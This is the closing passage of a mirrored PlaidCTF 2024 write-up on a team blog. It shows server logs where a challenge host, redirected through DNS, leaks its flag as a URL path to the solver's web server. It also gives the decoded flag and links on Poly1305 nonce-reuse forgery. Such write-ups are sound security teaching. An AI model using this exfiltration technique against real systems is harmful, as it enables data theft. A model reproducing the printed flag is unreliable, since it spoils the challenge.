<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ python Server.py        <br>DNS Listening on 192.168.178.79:53 ...<br>Request from (<span class="hljs-string">&#x27;44.203.85.176&#x27;</span>, 57501) <span class="hljs-keyword">for</span> example.com<br></code></pre></td></tr></table></figure>

<p>Right after that, weâ€™ll notice an incoming request to our <strong>web server</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>44.203.85.176 - - [15/Apr/2024 01:15:58] code 404, message File not found<br>44.203.85.176 - - [15/Apr/2024 01:15:58] <span class="hljs-string">&quot;GET /PCTF%7Bd0nt_r3u5e_th3_n0nc3_d4839ed727736624%7D HTTP/1.1&quot;</span> 404 -<br></code></pre></td></tr></table></figure>

<p>Of course, we wonâ€™t know the flag in advance, so we couldnâ€™t setup a file named like the flag; thus the <strong>web server</strong> will clearly respond with a <strong>404</strong> when being asked for the specified ressource, but we can still extract the name of the requested ressource and url-decode it to receive the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><span class="hljs-built_in">print</span>(unquote(<span class="hljs-string">&#x27;PCTF%7Bd0nt_r3u5e_th3_n0nc3_d4839ed727736624%7D&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p>And finally, there we go: <code>PCTF&#123;d0nt_r3u5e_th3_n0nc3_d4839ed727736624&#125;</code></p>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><h3 id="Networking-related"><a href="#Networking-related" class="headerlink" title="Networking related"></a>Networking related</h3><ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">Wikipedia: DHCP - Dynamic Host Configuration Protocol</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Domain_Name_System">Wikipedia: DNS - Domain Name System</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IP_address">Wikipedia: IP address</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MAC_address">Wikipedia: MAC address</a></li>
</ul>
<h3 id="Crypto-related"><a href="#Crypto-related" class="headerlink" title="Crypto related"></a>Crypto related</h3><ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SHA-2">Wikipedia: SHA256</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ChaCha20-Poly1305">Wikipedia: ChaCha20-Poly1305</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Poly1305">Wikipedia: Poly1305</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Message_authentication_code">Wikipedia: MAC - Message authentication code</a></li>
<li><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7539#section-2.8">RFC 7539: ChaCha20 and Poly1305 for IETF Protocols</a></li>
<li><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused">Forgery attack on Poly1305 when the key and nonce reused</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Cipher/ChaCha20_Poly1305.py">PyCryptodome ChaCha20_Poly1305.py</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Hash/Poly1305.py">PyCryptodome Poly1305.py</a></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              

              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="../../../01/14/uoftctf24/index.html" title="UofT CTF 2024 - [Zero] - Jail">
                        <span class="hidden-mobile">UofT CTF 2024 - [Zero] - Jail</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io/" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="../../../../../lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="../../../../../lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="../../../../../lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="../../../../../lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="../../../../../lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('../../../../../lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=../../../../../lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('../../../../../lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('../../../../../lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="../../../../../lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="../../../../js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>

<!-- Mirrored from l3ak.team/2024/04/21/plaid24/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 May 2025 17:30:19 GMT -->
</html>
